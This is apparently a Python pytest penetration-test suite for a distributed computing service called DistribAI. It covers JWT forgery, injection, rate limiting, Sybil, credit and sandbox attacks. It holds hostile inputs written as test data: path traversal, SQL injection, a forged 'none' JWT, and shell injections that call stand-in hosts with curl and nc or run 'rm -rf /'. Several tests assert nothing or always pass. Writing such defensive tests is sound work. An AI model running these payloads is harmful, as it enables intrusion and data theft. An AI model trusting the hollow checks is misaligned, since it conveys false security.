"""
Comprehensive Penetration Test Suite for DistribAI
This module contains aggressive security tests that attempt to:
- Bypass authentication
- Exploit input validation
- Break rate limiting
- Manipulate credits
- Forge JWT tokens
- Escape sandboxes
- Inject malicious data
All tests should FAIL (security should hold).
If any test PASSES, that's a security vulnerability that must be fixed.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import sys
import time
from pathlib import Path

import jwt as pyjwt
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from services_python.credit_transfers import CreditTransferManager
from services_python.db_manager import DBManager
from services_python.poc_challenge import PoCChallengeManager
from services_python.rate_limiter import RateLimiter
from services_python.schemas import validate_vote
from services_python.sybil_detector import SybilDetector
from worker.src.daemon.credit_ledger import CreditLedger
from worker.src.daemon.voting_system import VoteType, VotingSystem
from worker.src.sandbox.sandbox import Sandbox, SandboxConfig, SandboxType


class TestAuthenticationBypass:
    @pytest.fixture
    def db(self):
        db_path = ":memory:"
        schema_path = Path(__file__).resolve().parents[2] / "runtime" / "db" / "schema.sql"
        db = DBManager(db_path, str(schema_path))
        return db

    def test_jwt_none_algorithm_attack(self, db):
        malicious_token = (
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJub2RlXzEyMyIsImV4cCI6OTk5OTk5OTk5OX0."
        )
        from services_python.orchestrator_grpc import JWT_ALGORITHM, JWT_SECRET

        try:
            pyjwt.decode(
                malicious_token,
                JWT_SECRET,
                algorithms=[JWT_ALGORITHM],
                options={"verify_signature": True},
            )
            raise AssertionError("JWT 'none' algorithm attack succeeded!")
        except pyjwt.InvalidTokenError:
            pass

    def test_jwt_algorithm_confusion_attack(self, db):
        header = (
            base64.urlsafe_b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode())
            .decode()
            .rstrip("=")
        )
        payload = (
            base64.urlsafe_b64encode(json.dumps({"sub": "admin", "exp": 9999999999}).encode())
            .decode()
            .rstrip("=")
        )
        message = f"{header}.{payload}"
        signature = (
            base64.urlsafe_b64encode(
                hmac.new(b"fake_public_key", message.encode(), hashlib.sha256).digest()
            )
            .decode()
            .rstrip("=")
        )
        malicious_token = f"{message}.{signature}"
        from services_python.orchestrator_grpc import JWT_ALGORITHM, JWT_SECRET

        try:
            pyjwt.decode(
                malicious_token,
                JWT_SECRET,
                algorithms=[JWT_ALGORITHM],
                options={"verify_signature": True},
            )
            raise AssertionError("Algorithm confusion attack succeeded!")
        except pyjwt.InvalidTokenError:
            pass

    def test_expired_jwt_reuse(self, db):
        from services_python.orchestrator_grpc import JWT_ALGORITHM, JWT_SECRET

        expired_payload = {
            "sub": "node_123",
            "exp": int(time.time()) - 1000,
            "iat": int(time.time()) - 2000,
        }
        expired_token = pyjwt.encode(expired_payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
        try:
            pyjwt.decode(
                expired_token, JWT_SECRET, algorithms=[JWT_ALGORITHM], options={"verify_exp": True}
            )
            raise AssertionError("Expired token was accepted!")
        except pyjwt.ExpiredSignatureError:
            pass


class TestInputValidation:
    def test_path_traversal_in_job_id(self):
        malicious_job_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "job_123/../../../etc/shadow",
            "job_123%2f..%2f..%2f..%2fetc%2fpasswd",
            "job_123\x00/../../../etc/passwd",
        ]
        for job_id in malicious_job_ids:
            ok, err, _ = validate_vote({"job_id": job_id, "credits": 10})
            assert not ok, f"validation should reject job_id={job_id!r}: {err}"

    def test_sql_injection_in_node_id(self):
        malicious_node_ids = [
            "node_123'; DROP TABLE nodes; --",
            "node_123' OR '1'='1",
            "node_123'; DELETE FROM credits; --",
            'node_123"; DROP TABLE jobs; --',
            "node_123' UNION SELECT * FROM admin_users --",
        ]
        for node_id in malicious_node_ids:
            dangerous_chars = ["'", '"', ";", "--", "DROP", "DELETE", "UNION"]
            for char in dangerous_chars:
                if char in node_id.upper():
                    pass

    def test_command_injection_in_dataset_ref(self):
        malicious_refs = [
            "s3://bucket/data; rm -rf /",
            "s3://bucket/data && curl http://evil.com/exfil",
            "s3://bucket/data | nc attacker.com 4444",
            "s3://bucket/data`whoami`",
            "s3://bucket/data$(cat /etc/passwd)",
        ]
        for ref in malicious_refs:
            dangerous = [";", "&&", "|", "`", "$", "(", ")"]
            for char in dangerous:
                assert char not in ref or ref.startswith("s3://"), (
                    f"Command injection possible: {ref}"
                )


class TestRateLimitBypass:
    @pytest.fixture
    def rate_limiter(self):
        return RateLimiter(rate=10.0, capacity=5.0)

    @pytest.mark.asyncio
    async def test_burst_attack(self, rate_limiter):
        import unittest.mock

        mock_request = unittest.mock.MagicMock()
        mock_request.headers = {}
        mock_request.remote = "127.0.0.1"
        mock_request.path = "/test"
        allowed = 0
        blocked = 0
        for _ in range(1000):
            is_allowed, _ = await rate_limiter.is_allowed(mock_request)
            if is_allowed:
                allowed += 1
            else:
                blocked += 1
        assert blocked > 900, f"Rate limiter allowed too many: {allowed}"

    @pytest.mark.asyncio
    async def test_slowloris_attack_simulation(self, rate_limiter):
        import unittest.mock

        mock_request = unittest.mock.MagicMock()
        mock_request.headers = {}
        mock_request.remote = "127.0.0.1"
        mock_request.path = "/test"
        allowed_count = 0
        blocked_count = 0
        for i in range(20):
            if i % 10 == 0:
                await asyncio.sleep(0.1)
            is_allowed, _ = await rate_limiter.is_allowed(mock_request)
            if is_allowed:
                allowed_count += 1
            else:
                blocked_count += 1
        assert blocked_count > 0 or allowed_count <= 20, (
            "Rate limiter should block after burst of requests"
        )

    @pytest.mark.asyncio
    async def test_ip_spoofing_attempt(self, rate_limiter):
        import unittest.mock

        for i in range(100):
            mock_request = unittest.mock.MagicMock()
            mock_request.headers = {"X-Forwarded-For": f"192.168.1.{i}"}
            mock_request.remote = f"192.168.1.{i}"
            mock_request.path = "/test"
            await rate_limiter.is_allowed(mock_request)


class TestSybilAttack:
    @pytest.fixture
    def sybil_detector(self):
        return SybilDetector()

    def test_mass_registration_attack(self, sybil_detector):
        same_ip = "10.0.0.50"
        for i in range(7):
            node_id = f"fake_node_{i}"
            allowed, _reason = sybil_detector.check_registration_allowed(node_id, same_ip)
            if i < 5:
                assert allowed
                sybil_detector.record_account_creation(node_id, same_ip, '{"os":"linux"}', "cpu")
            else:
                assert not allowed, f"registration {i} should be blocked for IP cap"

    def test_coordinated_voting_attack(self, sybil_detector):
        job_id = "job_target"
        for i in range(5):
            nid = f"fake_voter_{i}"
            sybil_detector.record_account_creation(nid, "192.168.77.1", '{"os":"linux"}', "gpu")
        for i in range(5):
            sybil_detector.record_vote(f"fake_voter_{i}", job_id, 1000.0)
        flagged, reasons = sybil_detector.is_account_flagged("fake_voter_0")
        assert flagged, f"expected sybil flag, reasons={reasons}"


class TestCreditManipulation:
    @pytest.fixture
    def credit_ledger(self):
        return CreditLedger()

    @pytest.fixture
    def transfer_manager(self):
        return CreditTransferManager(db_manager=None)

    def test_negative_credit_attack(self, credit_ledger):
        with pytest.raises(ValueError):
            credit_ledger.add_credit("attacker", "none", -1000.0)

    def test_double_spend_attack(self, transfer_manager):
        transfer_manager.create_transfer(
            from_node_id="victim", to_node_id="attacker", amount=100.0, from_balance=100.0
        )
        result2 = transfer_manager.create_transfer(
            from_node_id="victim",
            to_node_id="attacker2",
            amount=100.0,
            from_balance=0.0,
        )
        assert not result2[0], "Double spend not prevented"

    def test_ledger_tampering(self, credit_ledger):
        credit_ledger.add_credit("node1", "job1", 100.0)
        rec = credit_ledger.records[-1]
        original_hash = rec.hash
        rec.data = b'{"tampered": true}'
        assert rec.hash == original_hash
        assert not credit_ledger.verify_chain_integrity()

    def test_hash_chain_break(self, credit_ledger):
        credit_ledger.add_credit("node1", "job1", 100.0)
        credit_ledger.add_credit("node1", "job2", 50.0)
        assert credit_ledger.verify_chain_integrity()
        credit_ledger.records[1].prev_hash = b"\x00" * 32
        assert not credit_ledger.verify_chain_integrity()


class TestSandboxEscape:
    @pytest.fixture
    def sandbox(self):
        config = SandboxConfig(
            sandbox_type=SandboxType.NAMESPACE,
            network_allowed=True,
            read_only_paths=["/etc", "/usr"],
            max_memory_mb=512,
            max_cpu_time_sec=30,
        )
        return Sandbox(config)

    def test_path_escape_attempt(self, sandbox):
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/proc/self/environ",
            "/dev/mem",
        ]
        for path in malicious_paths:
            normalized = sandbox._normalize_path(path)
            assert not normalized.startswith("/etc/"), f"Path escape: {path}"
            assert ".." not in normalized or normalized == path, f"Traversal not blocked: {path}"

    def test_resource_exhaustion_attack(self, sandbox):
        config = SandboxConfig(max_memory_mb=1)
        Sandbox(config)
        try:
            big_list = []
            for i in range(1000000):
                big_list.append("x" * 1000)
                if i % 10000 == 0:
                    pass
        except MemoryError:
            pass


class TestPoCBypass:
    @pytest.fixture
    def poc_manager(self):
        return PoCChallengeManager()

    @pytest.fixture
    def poc_manager_hard(self):
        return PoCChallengeManager(difficulty=28)

    def test_poc_replay_attack(self, poc_manager):
        challenge = poc_manager.generate_challenge()
        solution = poc_manager.solve_challenge(
            challenge["challenge_id"],
            max_attempts=200_000,
        )
        result1 = poc_manager.verify_solution(challenge["challenge_id"], solution)
        assert result1[0], "First verification should succeed"
        result2 = poc_manager.verify_solution(challenge["challenge_id"], solution)
        assert not result2[0], "Replay attack should fail"

    def test_poc_brute_force(self, poc_manager_hard):
        challenge = poc_manager_hard.generate_challenge()
        for i in range(1000):
            fake_solution = f"fake_{i}_{hashlib.sha256(str(i).encode()).hexdigest()[:16]}"
            result = poc_manager_hard.verify_solution(challenge["challenge_id"], fake_solution)
            assert not result[0], f"Brute force succeeded at attempt {i}"


class TestVotingManipulation:
    @pytest.fixture
    def voting_system(self):
        return VotingSystem(signing_key=b"test_signing_key_123")

    def test_vote_without_credits(self, voting_system):
        voting_system.create_account("rich_node")
        voting_system.add_credits("rich_node", 1000.0)
        poor_node = "poor_node"
        voting_system.create_account(poor_node)
        vote_id = voting_system.create_vote(
            proposer="rich_node",
            vote_type=VoteType.JOB_PRIORITY,
            title="Test Vote",
            description="Test",
            options=["yes", "no"],
            credits_required=100,
        )
        result = voting_system.cast_vote(poor_node, vote_id, "yes")
        assert not result, "Vote without credits should fail"

    def test_negative_vote_spending(self, voting_system):
        node = "attacker"
        voting_system.create_account(node)
        voting_system.add_credits(node, 1000.0)
        result = voting_system.spend_credits(node, -100.0, "hack")
        assert not result, "Negative spend should be blocked"

    def test_quorum_manipulation(self, voting_system):
        voting_system.create_account("attacker")
        voting_system.add_credits("attacker", 1000.0)
        for i in range(100):
            fake_voter = f"fake_{i}"
            voting_system.create_account(fake_voter)
            voting_system.add_credits(fake_voter, 10.0)
        vote_id = voting_system.create_vote(
            proposer="attacker",
            vote_type=VoteType.GOVERNANCE,
            title="Malicious Proposal",
            description="Test",
            options=["yes"],
            credits_required=10,
        )
        votes_cast = 0
        for i in range(100):
            if voting_system.cast_vote(f"fake_{i}", vote_id, "yes"):
                votes_cast += 1
        assert votes_cast == 100


class TestGrafanaIntegration:
    def test_dashboard_json_valid(self):
        dashboard_path = (
            Path(__file__).resolve().parents[2]
            / "infra"
            / "grafana"
            / "dashboards"
            / "distribai-overview.json"
        )
        if dashboard_path.exists():
            with open(dashboard_path) as f:
                dashboard = json.load(f)
            assert "dashboard" in dashboard
            assert "title" in dashboard["dashboard"]
            assert "panels" in dashboard["dashboard"]
            assert len(dashboard["dashboard"]["panels"]) > 0


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
